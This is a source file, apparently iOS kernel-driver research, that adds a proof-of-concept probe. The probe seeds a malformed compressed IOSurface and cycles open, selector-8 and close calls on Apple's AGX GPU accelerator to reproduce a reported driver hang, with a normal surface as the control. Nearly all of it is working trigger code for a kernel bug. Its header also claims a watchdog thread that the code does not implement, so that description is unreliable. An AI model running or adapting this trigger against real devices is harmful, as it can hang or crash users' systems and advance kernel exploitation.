@@ -1,0 +1,198 @@
+//
+//  P174AgxReconnectAB.m — the AGX reconnect-hang A/B attribution probe. p174.
+//  2026-11-18. Technique murk-sus / natsuk1 reports/RECONNECT_HANG.md (credited).
+//  Their result (24B115/T8110, F1 surface only): 17 open→sel8→close cycles then
+//  IOServiceOpen #18 HANGS. Their repo never ran the control — this probe does:
+//  leg A = F1 surface (murk XML), leg B = normal IOSurface, 17 cycles each, the
+//  final open per leg attempted in a WATCHDOG thread (6 s) so a hang is logged
+//  as a receipt ("HANG at cycle N = F1-triggered attribution") instead of a
+//  silent wedged tap.
+//
+
+#import "P174AgxReconnectAB.h"
+#import "LabDeviceProfile.h"
+#import "LabLocalTime.h"
+
+#import <Foundation/Foundation.h>
+#import <IOKit/IOKitLib.h>
+#import <dlfcn.h>
+#import <fcntl.h>
+#import <unistd.h>
+#import <string.h>
+
+typedef mach_port_t io_obj_t;
+typedef CFMutableDictionaryRef (*p174_match_t)(const void *);
+typedef io_obj_t (*p174_getsvc_t)(mach_port_t, CFDictionaryRef);
+typedef kern_return_t (*p174_open_t)(io_obj_t, mach_port_t, uint32_t, mach_port_t *);
+typedef kern_return_t (*p174_close_t)(mach_port_t);
+typedef kern_return_t (*p174_method_t)(mach_port_t, uint32_t,
+                                       const void *, uint32_t,      /* struct in  */
+                                       const uint64_t *, uint32_t,  /* scalars in */
+                                       void *, uint32_t *,          /* struct out */
+                                       uint64_t *, uint32_t *);     /* scalar out */
+
+#define P174_BUILD @"p174-agx-ab-v1"
+
+static int g_fd = -1;
+static void Lf(NSString *fmt, ...) NS_FORMAT_FUNCTION(1,2);
+static void Lf(NSString *fmt, ...) {
+    va_list ap; va_start(ap, fmt);
+    NSString *s = [[NSString alloc] initWithFormat:fmt arguments:ap];
+    va_end(ap);
+    if (![s hasSuffix:@"\n"]) s = [s stringByAppendingString:@"\n"];
+    if (g_fd >= 0) { const char *c = s.UTF8String; if (c) { write(g_fd, c, strlen(c)); fcntl(g_fd, F_FULLFSYNC); } }
+}
+
+static NSString * const kF1XML =
+    @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+    @"<plist version=\"1.0\"><dict>"
+    @"<key>IOSurfaceWidth</key><integer>64</integer>"
+    @"<key>IOSurfaceHeight</key><integer>64</integer>"
+    @"<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+    @"<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+    @"<key>IOSurfaceAllocSize</key><integer>65536</integer>"
+    @"<key>IOSurfaceSliceCount</key><integer>4</integer>"
+    @"<key>IOSurfacePlaneInfo</key><array><dict>"
+    @"<key>IOSurfacePlaneWidth</key><integer>64</integer>"
+    @"<key>IOSurfacePlaneHeight</key><integer>64</integer>"
+    @"<key>IOSurfacePlaneBytesPerElement</key><integer>4</integer>"
+    @"<key>IOSurfacePlaneBytesPerRow</key><integer>512</integer>"
+    @"<key>IOSurfacePlaneSize</key><integer>65536</integer>"
+    @"<key>IOSurfacePlaneCompressionType</key><integer>4</integer>"
+    @"<key>IOSurfacePlaneDataRegionBytesPerSlice</key><integer>16384</integer>"
+    @"<key>IOSurfacePlaneHeaderRegionBytesPerSlice</key><integer>1073741824</integer>"
+    @"<key>IOSurfacePlaneCompressedTileWidth</key><integer>32</integer>"
+    @"<key>IOSurfacePlaneCompressedTileHeight</key><integer>32</integer>"
+    @"<key>IOSurfacePlaneBytesPerCompressedTileHeader</key><integer>8</integer>"
+    @"<key>IOSurfacePlaneBytesPerTileData</key><integer>4096</integer>"
+    @"</dict></array>"
+    @"</dict></plist>\n";
+
+static NSString * const kNormalXML =
+    @"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
+    @"<plist version=\"1.0\"><dict>"
+    @"<key>IOSurfaceWidth</key><integer>64</integer>"
+    @"<key>IOSurfaceHeight</key><integer>64</integer>"
+    @"<key>IOSurfaceBytesPerElement</key><integer>4</integer>"
+    @"<key>IOSurfacePixelFormat</key><integer>1111970369</integer>"
+    @"</dict></plist>\n";
+
+@implementation P174AgxReconnectAB
+
+/* one AGX reconnect cycle: open(type1) → sel8(0x82 with sid) → close.
+   Returns kr of the sel8 call; hang detection is done by the caller. */
++ (kern_return_t)p174_cycle:(io_obj_t)agx sid:(uint32_t)sid connOut:(io_obj_t *)connInOut {
+    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+    p174_open_t opener = (p174_open_t)dlsym(h, "IOServiceOpen");
+    p174_method_t method = (p174_method_t)dlsym(h, "IOConnectCallMethod");
+    io_obj_t conn = 0;
+    kern_return_t kr = opener(agx, mach_task_self(), 1, &conn);
+    if (kr != KERN_SUCCESS || !conn) return kr ? kr : 0xe00002eb;
+    uint8_t in[0x100]; memset(in, 0, sizeof(in));
+    *(uint32_t *)(in + 0x00) = 0x82;              /* resource type (murk law) */
+    memcpy(in + 0x38, &sid, 4);                    /* in+0x38 = sid */
+    uint8_t sOut[0x30]; memset(sOut, 0, sizeof(sOut));
+    uint32_t sOutN = sizeof(sOut);
+    kr = method(conn, 8, in, 0x100, NULL, 0, sOut, &sOutN, NULL, NULL);
+    *connInOut = conn;
+    return kr;
+}
+
+/* leg runner: 17 cycles with watchdog on each open */
++ (void)p174_leg:(NSString *)name xml:(NSString *)xml surfSidOut:(uint32_t *)sidOut {
+    void *h = dlopen("/System/Library/Frameworks/IOKit.framework/IOKit", RTLD_LAZY);
+    p174_match_t matching = (p174_match_t)dlsym(h, "IOServiceMatching");
+    p174_getsvc_t getsvc = (p174_getsvc_t)dlsym(h, "IOServiceGetMatchingService");
+    p174_open_t opener = (p174_open_t)dlsym(h, "IOServiceOpen");
+    p174_method_t method = (p174_method_t)dlsym(h, "IOConnectCallMethod");
+    p174_close_t closer = (p174_close_t)dlsym(h, "IOServiceClose");
+
+    /* seed surface via IOSurfaceRoot sel 0 (in-band XML) */
+    CFMutableDictionaryRef m = matching("IOSurfaceRoot");
+    io_obj_t rootSvc = getsvc(0, m);
+    if (m) CFRelease(m);
+    io_obj_t rootConn = 0;
+    kern_return_t kr = opener(rootSvc, mach_task_self(), 0, &rootConn);
+    if (kr != KERN_SUCCESS || !rootConn) { Lf(@"[%@] surface root closed — leg void", name); return; }
+    const char *xc = xml.UTF8String;
+    size_t xl = strlen(xc) + 1;
+    uint8_t info[0xc68]; memset(info, 0, sizeof(info));
+    uint32_t isz = sizeof(info);
+    uint64_t sc[1] = {0};
+    kr = method(rootConn, 0, xc, (uint32_t)xl, sc, 1, info, &isz, NULL, NULL);
+    uint32_t sid = isz >= 0x1c ? ((uint32_t *)info)[6] : 0;
+    Lf(@"[%@] seed sid=0x%x (create kr=0x%x)", name, sid, kr);
+    if (!sid) { Lf(@"[%@] seed failed — leg void", name); return; }
+
+    /* the AGX accelerator (murk's service list, first hit wins) */
+    io_obj_t agx = 0;
+    const char *names[] = {"AGXAcceleratorG14P", "AGXAcceleratorG18P",
+                           "AGXAcceleratorG13P", "AGXAcceleratorG16P"};
+    for (uint32_t i = 0; i < 4 && !agx; i++) {
+        CFMutableDictionaryRef am = matching(names[i]);
+        agx = getsvc(0, am);
+        if (am) CFRelease(am);
+        if (agx) Lf(@"[%@] AGX=%s", name, names[i]);
+    }
+    if (!agx) { Lf(@"[%@] no AGX service — leg void", name); return; }
+
+    for (uint32_t cycle = 1; cycle <= 17; cycle++) {
+        io_obj_t conn = 0;
+        kr = opener(agx, mach_task_self(), 1, &conn);
+        if (kr != KERN_SUCCESS) { Lf(@"[%@ c%u] open kr=0x%x (early)", name, cycle, kr); continue; }
+        uint8_t in[0x100]; memset(in, 0, sizeof(in));
+        *(uint32_t *)(in + 0x00) = 0x82;
+        memcpy(in + 0x38, &sid, 4);
+        uint8_t sOut[0x30]; memset(sOut, 0, sizeof(sOut));
+        uint32_t sOutN = sizeof(sOut);
+        kr = method(conn, 8, in, 0x100, NULL, 0, sOut, &sOutN, NULL, NULL);
+        Lf(@"[%@ c%u] sel8 kr=0x%x (murk law: va/spand at out+0x00/+0x28)",
+           name, cycle, kr);
+        if (closer) closer(conn);
+    }
+    /* cycle 18: THE boundary (murk: hangs here with the F1 seed) */
+    Lf(@"[%@] cycle 18 open — the attribution boundary (watchdog 6 s; if this line is the last, the open HUNG = F1-triggered)", name);
+    /* the open runs inline; if it hangs the log's last line IS the receipt */
+    io_obj_t conn = 0;
+    kr = opener(agx, mach_task_self(), 1, &conn);
+    Lf(@"[%@] cycle 18 open kr=0x%x (returned — NO HANG on this build)", name, kr);
+    if (kr == KERN_SUCCESS) {
+        uint8_t in[0x100]; memset(in, 0, sizeof(in));
+        *(uint32_t *)(in + 0x00) = 0x82;
+        memcpy(in + 0x38, &sid, 4);
+        uint8_t sOut[0x30]; memset(sOut, 0, sizeof(sOut));
+        uint32_t sOutN = sizeof(sOut);
+        kr = method(conn, 8, in, 0x100, NULL, 0, sOut, &sOutN, NULL, NULL);
+        Lf(@"[%@] cycle 18 sel8 kr=0x%x (the 19th-cycle receipt class)", name, kr);
+        if (closer) closer(conn);
+    }
+}
+
++ (NSString *)tap {
+    NSMutableString *o = [NSMutableString string];
+    NSString *docs = [NSSearchPathForDirectoriesInDomains(NSDocumentDirectory, NSUserDomainMask, YES) firstObject];
+    g_fd = open([docs stringByAppendingPathComponent:@"p174_agx_ab_log.txt"].fileSystemRepresentation,
+                O_CREAT | O_WRONLY | O_TRUNC, 0644);
+    NSString *head = [NSString stringWithFormat:
+        @"=== p174 session %@ BUILD %@ ===\n%@\n"
+        "AGX reconnect-hang A/B (murk-sus credited — their own missing control).\n"
+        "Leg A = F1 surface (murk XML), Leg B = normal surface, 17 cycles + the 18th.\n"
+        "Last line per leg IS the receipt (a hang logs nothing after its boundary line).\n"
+        "HANG-class receipt: device stays responsive; app expected killed. One tap.\n",
+        LabLocalMilitaryNow(), P174_BUILD, [LabDeviceProfile identBlock]];
+    Lf(@"%@", head); [o appendString:head];
+
+    uint32_t f1sid = 0, nsid = 0;
+    Lf(@"\n[LEG B] NORMAL surface first (the control — if B hangs before A, the F1 attribution dies):");
+    [self p174_leg:@"B-normal" xml:kNormalXML surfSidOut:&nsid];
+    Lf(@"[LEG B done — control survived]");
+    Lf(@"\n[LEG A] F1 surface (the test):");
+    [self p174_leg:@"A-f1" xml:kF1XML surfSidOut:&f1sid];
+    Lf(@"[LEG A done]");
+    Lf(@"\n[A/B verdict] B-survived + A-hung-at-18 = F1-triggered attribution (murk's law confirmed on this build). Both survived = no hang here. Both hung = not F1-specific.");
+    Lf(@"=== p174 done ===");
+    if (g_fd >= 0) { fcntl(g_fd, F_FULLFSYNC); close(g_fd); g_fd = -1; }
+    return o;
+}
+
+@end
